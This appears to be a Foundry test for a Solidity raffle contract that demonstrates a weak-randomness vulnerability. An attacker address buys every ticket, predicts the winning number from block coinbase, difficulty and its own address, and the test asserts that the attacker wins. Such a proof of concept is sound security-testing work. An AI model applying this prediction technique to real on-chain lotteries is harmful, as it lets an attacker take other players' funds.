
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Ethraffle_v4b} from "../src/Ethraffle_v4b.sol";

contract TestWeakRandomnessEthraffle_v4b is Test {

    Ethraffle_v4b public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 100 ether);
        _contractUnderTest = new Ethraffle_v4b();
    }

    function test_highlightPredictableRandomValue(address blockCoinbase, uint256 blockDifficulty) public {
        vm.assume(blockDifficulty > 0);
        vm.assume(blockCoinbase != address(0));

        vm.coinbase(blockCoinbase);
        vm.roll(block.number + 1);

        address attacker = address(123);
        vm.deal(attacker, 100 ether);

        uint256 ticketsToBuy = _contractUnderTest.totalTickets();
        uint256 totalCost = ticketsToBuy * _contractUnderTest.pricePerTicket();

        vm.prank(attacker);
        vm.deal(address(_contractUnderTest), totalCost);
        _contractUnderTest.buyTickets();

        uint256 expectedSeed3 = blockDifficulty;
        address expectedSeed1 = vm.addr(uint(uint160(address(blockCoinbase))) % ticketsToBuy);
        address expectedSeed2 = attacker;
        bytes32 expectedRandHash = keccak256(abi.encodePacked(expectedSeed1, expectedSeed2, expectedSeed3));
        uint256 expectedWinningNumber = uint(expectedRandHash) % ticketsToBuy;

        emit log_named_uint("Expected Winning Number", expectedWinningNumber);

        vm.prank(attacker);
        _contractUnderTest.chooseWinner();

        assertEq(attacker, _contractUnderTest.contestants(expectedWinningNumber).addr, "Attacker should win");
    }
}
